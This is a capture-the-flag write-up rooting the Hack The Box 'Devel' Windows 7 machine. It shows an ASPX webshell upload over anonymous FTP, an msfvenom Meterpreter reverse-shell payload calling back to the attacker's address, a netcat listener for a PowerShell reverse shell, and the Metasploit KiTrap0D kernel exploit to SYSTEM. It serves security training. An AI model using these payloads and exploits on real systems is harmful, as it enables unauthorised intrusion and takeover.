---
title: "Hack The Box: Devel"
date: 2026-07-25
ref: WU-003
summary: "Rooting the retired HTB 'Devel' machine — exploiting anonymous FTP write access to an IIS webroot to upload an ASPX webshell, gaining an initial foothold as a low-privileged IIS service account, and escalating to SYSTEM via a local kernel privilege escalation vulnerability on an unpatched Windows 7 build."
tags: [hack-the-box, ftp, iis, aspx, windows, metasploit, ms10-015, ms11-046, privilege-escalation]
---

# Devel — Hack The Box Write-up

## Description

**Devel** is an easy Windows machine on Hack The Box that introduces the concept of chaining a misconfigured service with a local privilege escalation to achieve full system compromise. The attack path involves exploiting anonymous FTP access to an IIS webroot to upload a malicious ASPX payload, gaining initial access as a low-privileged IIS service account, and then escalating privileges to SYSTEM using an unpatched local kernel vulnerability.

**Retired machine — `devel.htb`**

- **IP Address:** 10.129.36.65
- **Operating System:** Windows 7 Enterprise (Build 7600)
- **Architecture:** x86

**Credentials:**
FTP allows for Anonymous access.
```FTP
Anonymous:Anonymous
```

**Nmap**

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-25 16:26 EDT
Nmap scan report for 10.129.36.65
Host is up (0.024s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.68 seconds
```

**Quick Services:**

| Port | Service                 |
| ---- | ----------------------- |
| 21   | FTP (Anonymous allowed) |
| 80   | HTTP (IIS 7.5)          |

**Completion Status:**

- Root Flag: [Yes]
- User Flag: [Yes]
- Completion: [Complete] (100%)


---
### Enumeration

The first step is to perform an initial reconnaissance scan to identify the services exposed by the target. Using Nmap with the default script (-sC) and service version detection (-sV) options provides a safe and efficient way to gather information about the host without relying on intrusive techniques.

The scan reveals that the target exposes only two network services, significantly reducing the attack surface and making the initial enumeration process relatively straightforward.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ nmap -sCV -oA Scans/Nmap-Service+Version 10.129.36.65

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd <-- Task 1
80/tcp open  http    Microsoft IIS httpd 7.5
```

The scan identifies two exposed services: FTP on port 21 and HTTP on port 80. Based on the Nmap results, FTP is the most promising initial attack vector because it appears to permit anonymous authentication. Misconfigured anonymous FTP shares can expose sensitive files or writable directories, making them a valuable target during early-stage enumeration.

As a result, the next step is to investigate the FTP service and determine what files or directories are accessible without authentication.

---
### FTP (Port 21)

The Nmap scan indicates that the FTP service allows anonymous authentication, making it the most promising starting point for enumeration. Misconfigured anonymous FTP shares can often expose sensitive files or provide write access, both of which may lead to further compromise.

To investigate the service, connect using the ftp client followed by the target's IP address. When prompted for credentials, authenticate using the username anonymous. Unless otherwise configured, the password can be left blank or set to anonymous, both of which are commonly accepted by anonymous FTP services. Once authenticated, enumerate the contents of the share and inspect any accessible files or directories for information that may assist in further exploitation.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ ftp 10.129.36.65
Connected to 10.129.36.65.
220 Microsoft FTP Service
Name (10.129.36.65:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp>
```

After successfully authenticating, the contents of the FTP share can be listed using the dir command. The directory contains three files of particular interest, each providing valuable clues about the underlying environment. Together, they suggest the location of the FTP share within the web server's directory structure, identify the web server software in use, and indicate the technologies and file types supported by the application. These observations will help guide the next stages of enumeration and exploitation.
```Shell
ftp> dir
229 Entering Extended Passive Mode (|||49158|)
150 Opening ASCII mode data connection.
03-18-17  02:06AM       <DIR>          aspnet_client <-- ASP?
03-17-17  05:37PM                  689 iisstart.htm <-- IIS Homepage?
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> get iisstart.htm
local: iisstart.htm remote: iisstart.htm <-- Grab the Homepage
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************************************************************|   689       29.41 KiB/s    00:00 ETA
226 Transfer complete.
689 bytes received in 00:00 (29.18 KiB/s)
```

Inspecting the contents of iisstart.htm reveals that it is the default landing page for Microsoft Internet Information Services (IIS). This strongly suggests that the FTP share is mapped to the web server's document root, meaning any files uploaded to the share may be served directly by the web application.

If this assumption is correct, it could provide a viable path to remote code execution. However, rather than relying on inference alone, it is important to validate this hypothesis by gathering supporting evidence before proceeding with exploitation.
```HTML
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ cat iisstart.htm                                                                                                
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>IIS7</title>
<style type="text/css">
<!--
body {
        color:#000000;
        background-color:#B3B3B3;
        margin:0;
}

#container {
        margin-left:auto;
        margin-right:auto;
        text-align:center;
        }

a img {
        border:none;
}

-->
</style>
</head>
<body>
<div id="container">
<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>
</div>
</body>
</html> 
```

With the hypothesis that the FTP share is mapped to the web server's document root, the next step is to investigate the HTTP service on port 80. If the files observed via FTP are also accessible through the web server, it will confirm that the share resides within the web root.

Establishing this relationship is a key finding, as it demonstrates that files uploaded via FTP can potentially be served over HTTP. This significantly expands the available attack surface and provides a foundation for developing a viable exploitation strategy.

---

# HTTP (Port 80)

Inspecting the web service is straightforward. Navigating to the target URL, http://10.129.36.65/, displays the default Microsoft IIS landing page. This matches the iisstart.htm file discovered earlier through FTP enumeration and provides further evidence that the FTP share may be linked to the web server's document root.
![IIS default landing page]({{ '/assets/img/htb-devel/Devel_HTTP_IIS.png' | relative_url }})

While the IIS landing page supports our assumption, it does not conclusively confirm that the FTP share is mapped to the web root. To validate this, we will upload a test file using our anonymous FTP access and attempt to access it through the web service.

We create a simple HTML file named proof.html, which will allow us to confirm whether files uploaded via FTP are being served by IIS. Successful access to this file through the browser would provide the evidence needed to confirm our findings.

> **Good Methodology — Validate Before Exploiting**
>
> The `proof.html` upload step is worth pausing on. Before uploading a webshell or any executable payload, confirming write access with a benign HTML file is good practice. It proves the upload path works, confirms the FTP share maps to the webroot, and avoids the noise of a failed payload upload if basic assumptions turn out to be wrong. It costs thirty seconds and eliminates one variable from the troubleshooting stack if something goes wrong later.

``` HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>HTB Devel - Proof of Upload</title>
<style>
body{
    font-family:Segoe UI,Arial,sans-serif;
    background:#f4f4f4;
    color:#333;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}
.box{
    background:white;
    padding:30px;
    border-radius:8px;
    box-shadow:0 2px 10px rgba(0,0,0,.15);
    text-align:center;
}
h1{color:#2e8b57;margin-top:0;}
</style>
</head>
<body>

<div class="box">
    <h1>✓ File Upload Successful</h1>
    <p>This page confirms write access to the IIS web root.</p>
    <p><strong>Target:</strong> Hack The Box - Devel</p>
    <p><strong>Timestamp:</strong> <script>document.write(new Date().toLocaleString());</script></p>
</div>
</body>
</html>
```

Using our existing anonymous FTP session, we upload the proof.html file to the server. The put command allows us to transfer the file to the FTP share, after which we can attempt to access it through the web service and verify whether it is being hosted by IIS.
```Shell
ftp> put proof.html <-- Task 2
local: proof.html remote: proof.html
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************************************************************|   827       26.28 MiB/s    --:-- ETA
226 Transfer complete.
827 bytes sent in 00:00 (33.24 KiB/s)
```

Navigating to http://10.129.36.65/proof.html confirms that the uploaded file is being served successfully by the web server. This provides conclusive evidence that the FTP share is mapped to the IIS web root directory.

With this relationship confirmed, we can begin to consider potential attack paths. Since we have the ability to upload files that are accessible through the web service, the next logical step is to investigate whether this can be leveraged to achieve code execution on the target.

![Proof of upload confirmation page rendered in Firefox]({{ '/assets/img/htb-devel/Devel_HTTP_Upload.png' | relative_url }})


> **Note — ASP and ASPX**
>
> When we accessed the FTP share earlier we noted the `aspnet_client` directory, which indicates the web server is likely running either `.asp` or `.aspx` files given that it is running IIS. Armed with our earlier Nmap scan showing `Microsoft-IIS/7.5` in the server banner, a quick search confirms that IIS 7.5 on Windows 7 supports both classic ASP and ASP.NET (ASPX). We will target ASPX as it is the more capable and modern of the two.


---

### ASPX Webshell

With the FTP and web service relationship confirmed, we can now begin testing whether the file upload functionality can be leveraged to achieve Remote Code Execution (RCE) on the target machine. Since IIS supports ASP.NET, we will first attempt to upload an `.aspx` webshell and determine whether it is executed by the web server.

To locate a suitable webshell, we use the `locate` command on our Kali machine to search for available .aspx payloads. We identify `/usr/share/webshells/aspx/cmdasp.aspx` as a suitable candidate and copy it into our working directory for easier management.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ mkdir exploit

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ cd exploit  

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ locate .aspx   
/home/kali/Documents/Hack The Box/Machines/Devel/exploit/shell.aspx
/home/kali/Documents/Hack The Box/Machines/Devel/exploit/shell2.aspx
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/laudanum/aspx/shell.aspx
/usr/share/metasploit-framework/data/templates/scripts/to_exe.aspx.template
/usr/share/metasploit-framework/data/templates/scripts/to_mem.aspx.template
/usr/share/sqlmap/data/shell/backdoors/backdoor.aspx_
/usr/share/sqlmap/data/shell/stagers/stager.aspx_
/usr/share/webshells/aspx/cmdasp.aspx <--- We will use this one!

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx
```

Using our existing FTP session, we upload the renamed webshell shell.aspx to the target machine. The put command is used to transfer the file to the FTP share, after which we can attempt to access it through the web service and determine whether IIS processes the file successfully.
```Shell
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49161|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************************************************************|  1442       32.74 MiB/s    --:-- ETA
226 Transfer complete.
1442 bytes sent in 00:00 (58.07 KiB/s)

```

Navigating to `http://10.129.36.65/shell.aspx` successfully loads the webshell, confirming that IIS is processing the uploaded ASPX file. We can verify command execution by running `whoami`, which reveals that commands are being executed under the context of the `iis apppool\web` virtual service account.

At this stage, we have achieved Remote Code Execution on the target; however, the current account context has limited privileges. Further enumeration and privilege escalation will be required to obtain higher-level access on the machine.

![Webshell whoami output showing iis apppool\web]({{ '/assets/img/htb-devel/Devel_WS_Whoami.png' | relative_url }})

With Remote Code Execution confirmed, the next step is to gather additional information about the target before attempting to establish a more interactive shell. While there are several methods available for upgrading our current access, it is important to first perform local enumeration to better understand the environment and identify potential privilege escalation paths.

Running the systeminfo command provides valuable information about the operating system and host configuration. The key findings are as follows:

1. A local user account named "babis" exists on the machine, which may be useful when locating the user flag later in the process.
2. The operating system details reveal that the target is running Windows 7 (32-bit), including the specific OS version and system architecture. This information will be useful when identifying potential vulnerabilities or applicable privilege escalation techniques.
3. The system has no installed hotfixes, indicating that the machine may be significantly outdated and potentially vulnerable to known local privilege escalation vulnerabilities.

![systeminfo output from the webshell]({{ '/assets/img/htb-devel/Devel_WS_Sysinfo.png' | relative_url }})

> **The Smoking Gun — `Hotfix(s): N/A`**
>
> The most significant single line in the `systeminfo` output is `Hotfix(s): N/A`. This tells us the machine has never received a single Windows Update since installation. Combined with the OS version being Windows 7 Build 7600 — the original RTM (Release to Manufacturing) build from 2009 — this dramatically widens the attack surface. Any local privilege escalation vulnerability discovered in the years between Windows 7's release and the end of mainstream support is potentially exploitable here, which is exactly what the Windows Exploit Suggester output later reflects.

---

### Interactive Shells

We now have several options available for upgrading our current access into a more interactive shell. To demonstrate different approaches, we will explore two methods that represent both automated and manual exploitation workflows.

To assist with generating the required payloads and listener configurations, we can use the online [RevShells](https://www.revshells.com/) tool created by 0day. This provides a quick and reliable way to generate reverse shell commands while reducing the chance of errors when preparing payloads.

**Meterpreter Reverse Shell**

We will begin with the automated approach by attempting to establish a Meterpreter session. A successful callback will provide access to the extensive functionality offered by the Metasploit Framework, which can assist with further enumeration, exploitation, and post-exploitation activities.

Using our [RevShells](https://www.revshells.com/) resource, we can generate both the `msfvenom` command required to create the payload and the corresponding Metasploit listener configuration needed to receive the connection. After providing our local IP address and listening port, we select an `.aspx` payload to match the IIS web server environment.

Based on the earlier `systeminfo` output, we know the target is running a 32-bit version of Windows, so we ensure that the generated payload matches the correct architecture.

![RevShells meterpreter payload generation]({{ '/assets/img/htb-devel/Devel_IS_Meterpreter.png' | relative_url }})

Using the generated command from the previous step, we create our Meterpreter payload and save it as met.aspx. Naming the file with a descriptive identifier helps us quickly recognise the payload type during the exploitation process and avoids confusion when managing multiple files.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.39 LPORT=443 -f aspx -o met.aspx    
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2873 bytes
Saved as: met.aspx
```

Using our existing FTP access, we upload the Meterpreter payload to the target machine. As before, we use the `put` command to transfer the `met.aspx` file to the IIS web root directory.
```Shell
ftp> put met.aspx
local: met.aspx remote: met.aspx
229 Entering Extended Passive Mode (|||49163|)
150 Opening ASCII mode data connection.
100% |************************************************************************************************************************************************|  2913       55.56 MiB/s    --:-- ETA
226 Transfer complete.
2913 bytes sent in 00:00 (118.54 KiB/s)
```

Navigating to `http://10.129.36.65/met.aspx` executes the uploaded payload and triggers a callback from the target machine. Our Meterpreter handler successfully receives the connection, providing us with an interactive Meterpreter session.

This session gives us a more powerful foothold on the machine and will be used in the next stage to automate enumeration and explore potential privilege escalation paths using the Metasploit Framework.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.14.39; set lport 443; exploit"
[sudo] password for kali: 
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
lhost => 10.10.14.39
lport => 443
[*] Started reverse TCP handler on 10.10.14.39:443 
[*] Sending stage (188998 bytes) to 10.129.36.65
[*] Meterpreter session 1 opened (10.10.14.39:443 -> 10.129.36.65:49164) at 2026-07-26 12:43:48 -0400

meterpreter >
```

**PowerShell Reverse Shell**

We can now take a more manual approach to getting a shell. Using our [RevShells](https://www.revshells.com/) resource we decide to chain our webshell with a PowerShell payload and a netcat listener. This will land us a shell but we will need to take a more manual approach than leaning on the Metasploit framework to do all the heavy lifting for us.

The command is Base64 encoded before being executed via the webshell to improve reliability. Encoding helps avoid issues caused by special characters, spaces, quotes, and shell metacharacters that may otherwise be interpreted or modified by the web application, HTTP requests, or the underlying command interpreter. The command is decoded on the target immediately before execution, ensuring it is processed exactly as intended.

![RevShells PowerShell Base64 payload generation]({{ '/assets/img/htb-devel/Devel_IS_PowerShell.png' | relative_url }})

We begin by setting up a Netcat listener on our attacking machine using `nc -lvnp 31337` to wait for the incoming connection. Once the listener is active, we copy the PowerShell payload into our webshell and execute it.

If successful, the target machine will initiate a reverse connection back to our listener, providing us with an interactive shell session.

![Webshell with PowerShell Base64 payload pasted and executed]({{ '/assets/img/htb-devel/Devel_IS_Webshell2PowerShell.png' | relative_url }})

The payload successfully connects back to our listener, providing us with an interactive shell on the target machine. We will continue from this point in the manual exploitation section, where we will perform further enumeration and explore the available privilege escalation paths.
```Powershell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ nc -lvnp 31337
listening on [any] 31337 ...
connect to [10.10.14.39] from (UNKNOWN) [10.129.36.65] 49162

PS C:\windows\system32\inetsrv> hostname
devel
PS C:\windows\system32\inetsrv> ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 4:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::98b:d20e:72f5:3c13
   Temporary IPv6 Address. . . . . . : dead:beef::1015:f515:bf19:79b
   Link-local IPv6 Address . . . . . : fe80::98b:d20e:72f5:3c13%15
   IPv4 Address. . . . . . . . . . . : 10.129.36.65
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:c01e%15
                                       10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
PS C:\windows\system32\inetsrv> whoami
iis apppool\web

```


> **Warning — Mislabelling Interactive**
>
> We later find that labelling this PowerShell session as interactive is a mistake. Its existence has been deliberately left here as a learning opportunity for both the writer and the reader — this could potentially save someone hours diagnosing an issue where certain commands and tools will not run due to still being inside a dumb shell.
>
> This will be addressed in the "Manual Privilege Escalation" section later.


---

### Automated Privilege Escalation

At this stage, we have confirmed that our current access is running under a low-privileged account, limiting the actions we can perform on the target machine. The next step is to identify potential privilege escalation opportunities that may allow us to move to a higher-privileged context.

When using Metasploit, we can leverage the `local_exploit_suggester` post-exploitation module to enumerate potential local exploits applicable to the target environment. This module compares the system information gathered from the session against known vulnerabilities and suggests possible escalation paths.

To begin, we background our active session and use the search function to locate the exploit suggester module. The results present two available options; however, we are interested in the local exploit module because our goal is to escalate privileges on the existing host rather than maintain access to a low-privileged account.
```Shell
meterpreter > bg
[*] Backgrounding session 1...
msf exploit(multi/handler) > search exploit suggester

Matching Modules
================

   #  Name Disclosure Date  Rank    Check  Description
   -  ---- ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  <-- task 3       normal  No     Multi Recon Local Exploit Suggester
   1  post/multi/recon/persistence_suggester    .                normal  No     Persistence Exploit Suggester


Interact with a module by name or index. For example info 1, use 1 or use post/multi/recon/persistence_suggester

msf exploit(multi/handler) > use 0
```

We load the exploit suggester module and use the `show options` command to review the required configuration. The module only requires a single option: the session it will run against.

Running `sessions -l` displays our active sessions, confirming that our previous Meterpreter session is assigned session ID 1. We select this session as the target for the exploit suggester module before running the enumeration.
```Shell
msf post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf post(multi/recon/local_exploit_suggester) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.39:443 -> 10.129.36.65:49164 (10.129.36.65)                                                                           
msf post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1 
```

We execute the module and allow it time to complete its checks against the target system. Once finished, the results will provide us with potential privilege escalation exploits that may be applicable to the current environment.
```Shell
msf post(multi/recon/local_exploit_suggester) > run
[*] 10.129.36.65 - Collecting local exploits for x86/windows...
<-----------------------------SNIP-------------------------------->
[*] Running check method for exploit 42 / 42
[*] 10.129.36.65 - Valid modules for session 1: 
```

Once the module completes, we are presented with 42 potential results, 16 of which are identified as potentially vulnerable. Combined with our earlier `systeminfo` output showing that the machine has no installed hotfixes, this suggests that several of the identified vulnerabilities may be applicable to the target environment.

These results provide a useful starting point for further investigation; however, each candidate should be validated before attempting exploitation to determine the most suitable privilege escalation path.

![Local exploit suggester results showing 16 potential vulnerabilities]({{ '/assets/img/htb-devel/Devel_APE_ExploitSuggest.png' | relative_url }})

For this walkthrough, we will use the exploit/windows/local/ms10_015_kitrap0d module as our privilege escalation method. This exploit is particularly useful for demonstrating the underlying mechanics of Windows local privilege escalation, which will be explored in greater detail later in the "Dissecting The Exploit" section.

> **MS10-015 (KiTrap0D)**
>
> MS10-015 is a local privilege escalation vulnerability in the Windows kernel that allows a local user to elevate privileges to **NT AUTHORITY\SYSTEM** by exploiting improper handling of kernel exceptions in the Virtual DOS Machine (VDM) subsystem.
>
> The exploit gets its name, *KiTrap0D*, from the Windows kernel function responsible for handling General Protection Fault (#GP) exceptions — exception vector 0xD (decimal 13) — which the vulnerability abuses to gain SYSTEM privileges.

After selecting the module, we review the required configuration options using the `show options` command. The module requires both the target session and a local host address for the generated payload callback.

We use the `setg` command to configure our `tun0` address as the global local host value. This ensures the setting is retained as the default option across future Metasploit modules, reducing the need to manually configure the same value each time.
```Shell
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.243.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)



View the full module info with the info, or info -d command.

msf exploit(windows/local/ms10_015_kitrap0d) > setg LHOST 10.10.14.39
LHOST => 10.10.14.39
msf exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
SESSION => 1
```

Running the exploit successfully creates a new session with "nt authority\system privileges". This confirms that we have successfully escalated from our previous low-privileged context and now have command execution within a high-integrity security context.
```Shell
msf exploit(windows/local/ms10_015_kitrap0d) > run
[*] Started reverse TCP handler on 10.10.14.39:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching msiexec to host the DLL...
[+] Process 2904 launched.
[*] Reflectively injecting the DLL into 2904...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (188998 bytes) to 10.129.36.65
[*] Meterpreter session 2 opened (10.10.14.39:4444 -> 10.129.36.65:49165) at 2026-07-26 13:23:15 -0400

meterpreter > shell
Process 2624 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system
```


---

### Manual Privilege Escalation

Using only our PowerShell session, we now need to take a more manual approach to enumeration and identify potential privilege escalation opportunities. At this stage, our primary source of information is the previously collected `systeminfo` output, which revealed that the target is running an outdated version of Windows with no installed hotfixes. This indicates that the machine may be vulnerable to several known local privilege escalation vulnerabilities.

During our research, we found that many commonly referenced Windows privilege escalation enumeration tools were either outdated, archived, or difficult to use against such an old target environment. For example, newer tools often required dependencies that were not compatible with the machine, such as newer .NET versions, making it challenging to find a suitable option that allowed us to continue our enumeration.

After some time, we identified [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng) as a suitable tool for this scenario. WES-NG analyses the output from a `systeminfo` command and compares the results against known vulnerabilities, allowing us to identify potential privilege escalation paths without needing to execute additional enumeration tools on the target.

We begin by cloning the repository into our working directory and moving into the newly created folder. We then place the `systeminfo` output collected from the Devel machine into a text file within the directory, ready for analysis.

```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ git clone https://github.com/bitsadmin/wesng.git

Cloning into 'wesng'...
remote: Enumerating objects: 1571, done.
remote: Counting objects: 100% (44/44), done.
remote: Compressing objects: 100% (40/40), done.
remote: Total 1571 (delta 8), reused 11 (delta 4), pack-reused 1527 (from 4)
Receiving objects: 100% (1571/1571), 316.06 MiB | 32.82 MiB/s, done.
Resolving deltas: (903/903), done.

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ cd wesng

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/wesng]
└─$ cat systeminfo.txt 
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ??
System Boot Time:          27/7/2026, 4:30:08 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.439 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.502 MB
Virtual Memory: In Use:    639 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.36.65
                                 [02]: fe80::a843:726:aad7:a733
                                 [03]: dead:beef::a185:4222:efa5:99ee
                                 [04]: dead:beef::a843:726:aad7:a733
 
```

Before analysing the system information, we first need to update WES-NG and retrieve the latest vulnerability definitions required for the tool to perform its checks.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/wesng]
└─$ python3 wes.py --update
Windows Exploit Suggester 1.06 ( https://github.com/bitsadmin/wesng/ )
[+] Updating definitions
[+] Obtained definitions created at 20260716 
```

We run the tool against the `systeminfo.txt` file, which produces a list of known vulnerabilities that may be applicable to the target. For readability, the output has been reduced to highlight only the two exploits we will explore further in the "Dissecting The Exploit" Section.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/wesng]
└─$ python3 wes.py systeminfo.txt --impact "Elevation of Privilege"
Windows Exploit Suggester 1.06 ( https://github.com/bitsadmin/wesng/ )
[+] Parsing systeminfo output
[+] Operating System
    - Name: Windows 7 for 32-bit Systems
    - Generation: 7
    - Build: 7600
    - Version: None
    - Architecture: 32-bit
    - Installed hotfixes: None
[+] Loading definitions
    - Creation date of definitions: 20260716
[+] Determining missing patches
[+] Applying display filters
[!] Found vulnerabilities!                                                                                                                                            Date: 20100209                                             
CVE: CVE-2010-0233                                         
KB: KB977165                                               
Title: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege
Affected product: Windows 7 for 32-bit Systems             
Affected component:                                        
Severity: Important                                        
Impact: Elevation of Privilege                             
Exploit: https://exploit-db.com/exploits/33593                                                                        
Date: 20110614
CVE: CVE-2011-1249
KB: KB2503665
Title: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege
Affected product: Windows 7 for 32-bit Systems
Affected component:
Severity: Important
Impact: Elevation of Privilege
Exploits: https://exploit-db.com/exploits/18755, https://exploit-db.com/exploits/40564   

[-] Missing patches: 23                                    
    - KB2840149: patches 4 vulnerabilities                 
    - KB2808735: patches 4 vulnerabilities                 
    - KB2742598: patches 4 vulnerabilities                 
    - KB2756920: patches 4 vulnerabilities                 
    - KB2742595: patches 4 vulnerabilities                 
    - KB2807986: patches 3 vulnerabilities                 
    - KB2656351: patches 3 vulnerabilities                 
    - KB2656355: patches 3 vulnerabilities                 
    - KB2813170: patches 2 vulnerabilities                 
    - KB2425227: patches 2 vulnerabilities                 
    - KB2393802: patches 2 vulnerabilities                 
    - KB982799: patches 2 vulnerabilities                  
    - KB977165: patches 2 vulnerabilities                  
    - KB2790113: patches 1 vulnerability                   
    - KB2789644: patches 1 vulnerability                   
    - KB2789642: patches 1 vulnerability                   
    - KB2778930: patches 1 vulnerability                   
    - KB2690533: patches 1 vulnerability                   
    - KB2633171: patches 1 vulnerability                   
    - KB2620712: patches 1 vulnerability                   
    - KB2503665: patches 1 vulnerability                   
    - KB2442962: patches 1 vulnerability                   
    - KB2305420: patches 1 vulnerability                   
[I] KB with the most recent release date                   
    - ID: KB2840149                                        
    - Release date: 20130409                               
[+] Done. Displaying 49 of the 236 vulnerabilities found.      
```


The output identifies 49 potential exploits that may be applicable to the target; however, we will focus on two for this walkthrough. The first is the KiTrap0D vulnerability, which we have already exploited using Metasploit. The second is an exploit that can be obtained as a precompiled binary and executed manually, allowing us to explore an alternative exploitation path.

| Exploit                 | CVE               | Description                                                             |
| ----------------------- | ----------------- | ----------------------------------------------------------------------- |
| **MS10-015 (KiTrap0D)** | **CVE-2010-0233** | Windows Kernel General Protection Fault local privilege escalation.     |
| **MS11-046 (AFD.sys)**  | **CVE-2011-1249** | Windows Ancillary Function Driver (AFD.sys) local privilege escalation. |

